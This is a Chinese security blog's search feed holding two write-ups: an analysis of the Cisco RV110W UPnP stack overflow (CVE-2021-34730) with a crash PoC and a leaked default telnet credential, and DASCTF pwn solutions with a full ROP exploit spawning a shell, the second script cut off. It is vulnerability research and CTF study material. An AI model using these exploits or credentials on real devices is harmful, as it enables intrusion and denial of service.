<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2021-34730-RV110W-upnp漏洞分析</title>
    <link href="/2023/07/30/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2023/07/30/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-34730-RV110W-upnp漏洞分析"><a href="#CVE-2021-34730-RV110W-upnp漏洞分析" class="headerlink" title="CVE-2021-34730-RV110W-upnp漏洞分析"></a>CVE-2021-34730-RV110W-upnp漏洞分析</h1><p>笔者使用的固件版本为RV110W- 1.2.2.5。这个版本的固件存在CVE-2020-3330漏洞，运行了telnet服务且可以泄露telnet的用户名和密码，admin:Admin123。</p><p>需要注意的一点是，这里是upnp漏洞，需要保证upnp服务的开启。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731091721306.png" alt="image-20230731091721306"></p><p>使用telnet连接到路由器，查看进程。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731091927631.png" alt="image-20230731091927631"></p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Cisco Small Business RV110W、RV130、RV130W和RV215W路由器的通用即插即用（UPnP）服务中的漏洞可能允许未经身份验证的远程攻击者执行任意代码或导致受影响的设备意外重新启动，从而导致拒绝服务（DoS）情况。</p><h2 id="UPnP协议"><a href="#UPnP协议" class="headerlink" title="UPnP协议"></a>UPnP协议</h2><p>UPnP（Universal Plug and Play），即通用即插即用协议。旨在简化和改进网络设备之间的互操作性和通信。它允许网络中的各种设备自动发现彼此，并建立连接，以便进行数据传输和共享资源。</p><p>UPNP协议栈如下图所示：</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/upnp.png" alt="upnp"></p><p>可以看到，upnp协议栈是建立在ip层之上的。upnp由ssdp(简单服务发现协议)、soap(简单对象访问协议)以及gena(通用事件通知框架)这几个协议构成。这里我们主要介绍ssdp协议。</p><p>SSDP(Simple Service Discover Protocol) 简单服务发现协议，这个协议是 UPnP 的核心。SSDP 使用一个固定的组播地址 <code>239.255.255.250</code> 和 UDP 端口号 <code>1900</code> 来监听其他设备的请求。任何设备即使不使用UPnP协议也都可以监听这个多播地址，收到其中的信息。</p><p>SSDP 协议的请求消息有两种类型，第一种是<strong>服务通知</strong>，设备和服务使用此类通知消息声明自己存在；第二种是<strong>查询请求</strong>，协议客户端用此请求查询某种类型的设备和服务。</p><p>这里我们写一个简单的脚本，模拟upnp客户端，向upnp服务端发送<strong>查询请求</strong>，查看路由器是否开启了upnp服务。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>msg = \<br>    <span class="hljs-string">b&#x27;M-SEARCH * HTTP/1.1\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;HOST:239.255.255.250:1900\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;ST:upnp:rootdevice\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;MX:2\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;MAN:&quot;ssdp:discover&quot;\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;\r\n&#x27;</span><br><br>s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)<br>s.bind((<span class="hljs-string">b&quot;192.168.1.71&quot;</span>, <span class="hljs-number">23333</span>))  <span class="hljs-comment"># 绑定本机IP</span><br>s.settimeout(<span class="hljs-number">2</span>)<br>s.sendto(msg, (<span class="hljs-string">b&#x27;239.255.255.250&#x27;</span>, <span class="hljs-number">1900</span>))<br>addr = (<span class="hljs-string">&#x27;192.168.1.1&#x27;</span>, <span class="hljs-number">1900</span>)  <span class="hljs-comment"># </span><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        data, addr = s.recvfrom(<span class="hljs-number">65507</span>)<br>        <span class="hljs-built_in">print</span>(addr, data)<br><br><span class="hljs-keyword">except</span> socket.timeout:<br>    <span class="hljs-keyword">pass</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731090251849.png" alt="image-20230731090251849"></p><p>这里我们收到了upnp服务端的响应，说明路由器确实是开放了upnp服务。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>upnp服务主要是在函数<code>upnp_mainloop</code>实现的。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230730220317990.png" alt="image-20230730220317990"></p><p>这里初始化upnp服务，然后根据flag的值，选择对应的实现逻辑，这里我们主要看<code>upnp_dispatch</code>函数。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230730222028538.png" alt="image-20230730222028538"></p><p>这里主要逻辑应该是初始化ssdp请求，然后<code>upnp_http_process</code>监听连接，最后发送upnp请求。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731101028423.png" alt="image-20230731101028423"></p><p>调用了<code>upnp_http_fsm_engine</code>函数，这个函数不断调用<strong>fun_ptr</strong>函数指针数组的内容。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731101233468.png" alt="image-20230731101233468"></p><p>函数指针数组内容如下图所示，这里我们主要关注<code>upnp_http_fsm_dispatch</code>这个函数。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731101323625.png" alt="image-20230731101323625"></p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731101426794.png" alt="image-20230731101426794"></p><p>这个函数的具体值需要我们通过动态调试获取。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731101722302.png" alt="image-20230731101722302"></p><p>通过动态调试，可以确定该函数为<code>sub_405b34</code>。</p><p>逆向分析该函数，可以发现该函数对uuid字段长度检验不严格，从而导致栈溢出。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230730221246813.png" alt="image-20230730221246813"></p><p>这里分析<code>ssdp_msearch_response</code>函数。</p><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230730221353931.png" alt="image-20230730221353931"></p><p>该函数存在两个判断，需要过掉判断才能正常调用<code>ssdp_response</code>函数。</p><p>但是通过动态调试我们可以发现，这两个判断都是可以自动过掉的，所以我们也就不需要关注这两个判断。</p><p>最后返回到<code>sub_405b34</code>。</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p><strong>poc</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>targer_ip = <span class="hljs-string">&quot;192.168.1.1&quot;</span><br>target_port = <span class="hljs-number">1900</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xa0</span><br>payload += <span class="hljs-string">b&#x27;bbbb&#x27;</span><br><br>msg = \<br>    <span class="hljs-string">b&#x27;M-SEARCH * HTTP/1.1\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;HOST:239.255.255.250:1900\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;ST:uuid:&#x27;</span> + payload + <span class="hljs-string">b&#x27;\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;MX:2\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;MAN:&quot;ssdp:discover&quot;\r\n&#x27;</span> \<br>    <span class="hljs-string">b&#x27;\r\n&#x27;</span><br><br>s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)<br><br>s.sendto(msg, (targer_ip, target_port))<br><br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2021-34730-RV110W-upnp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230731105353515.png" alt="image-20230731105353515"></p><p><strong>利用</strong></p><p>剩下的利用可以参考笔者<a href="https://bbs.kanxue.com/thread-278129.htm">这篇文章</a>。都是大同小异的流程。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.jianshu.com/p/5c1330632fc7">https://www.jianshu.com/p/5c1330632fc7</a></p><p><a href="https://blog.csdn.net/andrewgithub/article/details/107372276">https://blog.csdn.net/andrewgithub/article/details/107372276</a></p><p><a href="https://zhuanlan.zhihu.com/p/40407669">https://zhuanlan.zhihu.com/p/40407669</a></p><p><a href="https://bbs.kanxue.com/thread-272634.htm">https://bbs.kanxue.com/thread-272634.htm</a></p><p><a href="https://7ee1n.github.io/2021/10/11/ciscoRV130w/">https://7ee1n.github.io/2021/10/11/ciscoRV130w/</a></p><p><a href="https://badmonkey.site/archives/cisco-rv110w-upnp-0day">https://badmonkey.site/archives/cisco-rv110w-upnp-0day</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve upnp mips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023-dasctf7月部分复现-pwn</title>
    <link href="/2023/07/23/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/"/>
    <url>/2023/07/23/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/</url>
    
    <content type="html"><![CDATA[<h1 id="2023-dasctf7月部分复现-pwn"><a href="#2023-dasctf7月部分复现-pwn" class="headerlink" title="2023-dasctf7月部分复现-pwn"></a>2023-dasctf7月部分复现-pwn</h1><h2 id="FileEditor"><a href="#FileEditor" class="headerlink" title="FileEditor"></a>FileEditor</h2><p>这个题在比赛时始终没找到漏洞，真栓Q。</p><p>查看保护。</p><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725153648174.png" alt="image-20230725153648174"></p><p>题目维护了一个简单的结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">int</span> flag;<br>  <span class="hljs-type">char</span> content[<span class="hljs-number">204</span>];<br>  file *next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>题目有很多复杂的功能，做到了文件的增删改查，以及字符串的查找与替换。</p><p>题目漏洞点是，在查找字符串是存在栈溢出。</p><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725154049407.png" alt="image-20230725154049407"></p><p>这么明显都没看到，果然我还是该锻炼锻炼眼力了。</p><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725154201384.png" alt="image-20230725154201384"></p><p>这个函数也是千奇百怪的，明显是为了出题而设计的。无语。。。</p><p>解题思路如下：</p><ol><li>利用查找字符串功能，将栈中内容复制到content中</li><li>利用修改功能，逐个覆盖’\x00’为’\n’，泄露canary，以及libc地址</li><li>直接打rop链</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">29655</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt; choose:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dasopen</span>():<br>    menu(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    menu(<span class="hljs-number">2</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">insert</span>(<span class="hljs-params">line, nums, content: <span class="hljs-built_in">list</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;please enter n m:&#x27;</span>, <span class="hljs-built_in">str</span>(line))<br>    p.sendline(<span class="hljs-built_in">str</span>(nums))<br>    p.recvuntil(<span class="hljs-string">&#x27;be inserted in sequence:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nums):<br>        p.sendline(content[i])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">pos, nums</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;lines to delete&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(pos))<br>    p.sendline(<span class="hljs-built_in">str</span>(nums))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">modify</span>(<span class="hljs-params">line, content</span>):<br>    menu(<span class="hljs-number">6</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;number to be modified:&#x27;</span>, <span class="hljs-built_in">str</span>(line))<br>    p.sendlineafter(<span class="hljs-string">&#x27;new content:&#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>(<span class="hljs-params">search</span>):<br>    menu(<span class="hljs-number">7</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;string to search for:&#x27;</span>, search)<br>    p.sendlineafter(<span class="hljs-string">&#x27;continue searching? (y/n)&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save</span>():<br>    menu(<span class="hljs-number">9</span>)<br><br><br>dasopen()<br><br>insert(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, [<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x62</span> + <span class="hljs-string">&#x27;l1s00t&#x27;</span>])<br><br>find(<span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br><br>modify(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x62</span> + <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>canary = u64(p.recv(<span class="hljs-number">8</span>)) &gt;&gt; <span class="hljs-number">8</span> &lt;&lt; <span class="hljs-number">8</span><br>lg(<span class="hljs-string">&#x27;canary&#x27;</span>, canary)<br><br>modify(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x72</span> + <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>code_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) &gt;&gt; <span class="hljs-number">8</span> &lt;&lt; <span class="hljs-number">8</span><br>code_base = code_base - <span class="hljs-number">0x1500</span><br>lg(<span class="hljs-string">&#x27;code_base&#x27;</span>, code_base)<br><br>modify(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0xa8</span>)<br>show()<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) &gt;&gt; <span class="hljs-number">8</span> &lt;&lt; <span class="hljs-number">8</span><br>libc_base = libc_base - <span class="hljs-number">0x24000</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>execve = libc_base + libc.sym[<span class="hljs-string">&#x27;execve&#x27;</span>]<br><br>pop_rdi_ret = code_base + <span class="hljs-number">0x0000000000002ac3</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002601f</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x0000000000142c92</span><br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0x62</span>: <span class="hljs-string">&#x27;l1s00t&#x27;</span>,<br>        <span class="hljs-number">0x68</span>: [<br>            canary, <span class="hljs-number">0</span>,<br>            pop_rdi_ret, libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__(),<br>            pop_rsi_ret, <span class="hljs-number">0</span>,<br>            pop_rdx_ret, <span class="hljs-number">0</span>,<br>            execve<br>        ]<br>    &#125;<br>)<br>insert(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, [payload])<br><br><span class="hljs-comment"># dbg()</span><br><br>find(<span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725153246138.png" alt="image-20230725153246138"></p><h2 id="VIPhouse"><a href="#VIPhouse" class="headerlink" title="VIPhouse"></a>VIPhouse</h2><p>这个题栽在了泄露随机字符上。一直在想怎么覆盖掉随机字符，从而绕过检测。没想到师傅们是直接爆破1byte绕过的。</p><p>查看保护。</p><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725101042326.png" alt="image-20230725101042326"></p><p>使用打开文件的方式写入随机数，无法预测。</p><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725101623749.png" alt="image-20230725101623749"></p><p>使用<code>strcpy</code>将随机字符放入栈中，可以想到首字节’\x00’绕过，这样后续的字符也为’\x00’了。所以说，相当于爆破首字节为’\x00’。</p><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725101254804.png" alt="image-20230725101254804"></p><p>login函数存在栈溢出。</p><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725101559124.png" alt="image-20230725101559124"></p><p>注意到login比较的时候，把我们输入的字符串放到了rdi的位置。</p><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725100912317.png" alt="image-20230725100912317"></p><p>同时，能够找到一个比较好用的gadget。两者结合，可以触发格式化字符串漏洞。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">00000000004016<span class="hljs-built_in">DD</span> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><span class="hljs-comment">; call _printf; nop; pop rbp; retn</span><br></code></pre></td></tr></table></figure><p>可以直接打格式化字符串那一套，也可以利用格式化字符串泄露地址，构造rop链。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./viphouse&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-comment"># if debug:</span><br><span class="hljs-comment">#     p = process(fn)</span><br><br><span class="hljs-comment"># else:</span><br><span class="hljs-comment">#     p = remote()</span><br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;an option: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">name, payload</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;your username: &#x27;</span>, name)<br>    p.sendlineafter(<span 